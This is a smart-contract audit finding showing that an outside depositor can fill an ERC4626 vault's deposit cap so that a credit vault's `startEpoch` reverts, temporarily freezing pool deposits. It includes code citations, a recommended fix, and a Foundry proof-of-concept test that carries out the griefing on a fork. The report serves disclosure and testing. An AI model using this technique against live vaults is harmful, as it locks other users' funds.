### Title

ERC4626 deposit-cap griefing can prevent a programmable credit vault from starting an epoch - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

`ProgrammableBorrower.onStartEpoch` attempts to deposit its entire idle balance into the configured ERC4626 vault without checking `maxDeposit` or retaining any excess on hand. An unprivileged depositor in that ERC4626 vault can consume enough remaining capacity to make the credit vault’s `startEpoch` transaction revert every time.

### Finding Description

During the buffer, LP deposits are held by `IdleCreditVault`, which mints strategy tokens and tracks them as `totEpochDeposits`. [1](#0-0) 

When the manager calls `IdleCDOEpochVariant.startEpoch`, the strategy returns those deposits to the CDO, the CDO transfers the surplus to the programmable borrower, and `_startEpochProgrammableBorrower` invokes `ProgrammableBorrower.onStartEpoch`. [2](#0-1) 

`onStartEpoch` snapshots total assets and then calls `_depositToVault` with the borrower’s entire underlying balance. [3](#0-2) 

`_depositToVault` unconditionally calls `vault.deposit(_assetAmount, address(this))` and never caps the call against `vault.maxDeposit(address(this))`. [4](#0-3) 

ERC4626 deposits are allowed—and expected—to revert when the requested assets exceed the vault’s available deposit capacity. [5](#0-4) 

The same unchecked full-deposit pattern also exists in active-epoch repayments, where `repay` deposits the full repayment amount back into the vault. [6](#0-5) 

### Impact Explanation

An ERC4626 vault user can fill the remaining deposit capacity so that `capacity < poolDeposit`, then the next `startEpoch` call reverts after the borrower receives the pool funds because `vault.deposit(poolDeposit)` exceeds the remaining capacity. [7](#0-6) 

Because `onStartEpoch` is called inside the successful `sendFundsToBorrower` branch and is not wrapped in another `try/catch`, the revert rolls back the borrower transfer and all epoch-start state changes, leaving the pool in the buffer phase. [8](#0-7) 

The attacker can repeat this whenever sufficient capacity reopens, temporarily freezing all queued pool deposits and preventing withdraw requests from progressing into a funded epoch. The required attacker capital is bounded by the vault’s remaining deposit capacity, not by the credit vault TVL.

### Likelihood Explanation

The attack requires a cap-constrained ERC4626 vault that accepts the credit vault’s underlying and permits the attacker to deposit. No privileged credit-vault role, borrower misbehavior, oracle manipulation, or malicious vault contract is required; the only external assumption is that the ERC4626 vault enforces a finite deposit cap.

The issue is a griefing vector rather than permanent theft: once enough vault capacity becomes available, `startEpoch` can be retried successfully.

### Recommendation

Before depositing, query `vault.maxDeposit(address(this))` and deposit at most the available capacity.

For `onStartEpoch`, leave any excess underlying on the borrower contract; `startAssets` already records the pre-deposit total, so undeployed cash can remain part of the facility balance. For `repay`, account for undeployed principal explicitly so assets retained on hand are not mistaken for vault losses by `_vaultNetInterest`.

Optionally treat an unexpected `vault.deposit` revert as a partial/no deployment rather than reverting the entire epoch transition, while preserving correct principal-versus-interest accounting.

### Proof of Concept

Add this regression test to the existing `test/foundry/ProgrammableBorrowerCreditVault.t.sol` fixture:

```solidity
function testStartEpochDosByFillingVaultDepositCap() external {
    _setUpProgrammableBorrowerCreditVault(
        GAUNTLET_FORK_BLOCK,
        GAUNTLET_USDC_PRIME
    );

    IERC4626 externalVault = IERC4626(GAUNTLET_USDC_PRIME);
    uint256 poolDeposit = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(poolDeposit);

    uint256 capacity =
        externalVault.maxDeposit(address(programmableBorrower));
    assertGt(capacity, poolDeposit, "fixture must have headroom");
    assertLt(capacity, type(uint256).max, "fixture must be capped");

    // Leave one unit less than the pool deposit available.
    uint256 attackerDeposit = capacity - poolDeposit + 1;
    address attacker = makeAddr("external-vault-depositor");

    deal(USDC, attacker, attackerDeposit);
    vm.startPrank(attacker);
    IERC20Detailed(USDC).approve(address(externalVault), attackerDeposit);
    externalVault.deposit(attackerDeposit, attacker);
    vm.stopPrank();

    assertEq(
        externalVault.maxDeposit(address(programmableBorrower)),
        poolDeposit - 1
    );

    // startEpoch transfers poolDeposit to ProgrammableBorrower, then
    // onStartEpoch tries vault.deposit(poolDeposit), which exceeds the cap.
    vm.prank(manager);
    vm.expectRevert();
    cdoEpoch.startEpoch();

    assertFalse(cdoEpoch.isEpochRunning());
    assertFalse(cdoEpoch.paused() && cdoEpoch.isEpochRunning());

    // The freeze is temporary: once the attacker releases capacity, start works.
    uint256 attackerShares = externalVault.balanceOf(attacker);
    vm.prank(attacker);
    externalVault.redeem(attackerShares, attacker, attacker);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertTrue(cdoEpoch.isEpochRunning());
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L596-614)
```text
  function deposit(uint256 _amount)
    external
    virtual
    override
    returns (uint256) {
    _onlyIdleCDO();
    if (_amount > 0) {
      underlyingToken.safeTransferFrom(msg.sender, address(this), _amount);
      _mint(msg.sender, _amount);
    }

    if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
      // deposit done on stopEpoch (before setting the var to false) so we reset the counter
      totEpochDeposits = 0;
      epochNumber += 1;
    } else {
      // deposit done between epochs so we increase the counter
      totEpochDeposits += _amount;
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L270-303)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-220)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-384)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L523-528)
```text
    emit Repaid(interestPaid + principalPaid, interestPaid, principalPaid);
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
    } else if (currentEpochInterestPaid != 0) {
```

**File:** contracts/interfaces/IERC4626.sol (L101-111)
```text
    /**
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
     *   deposit execution, and are accounted for during deposit.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     *
     * NOTE: most implementations will require pre-approval of the Vault with the Vault’s underlying asset token.
     */
```
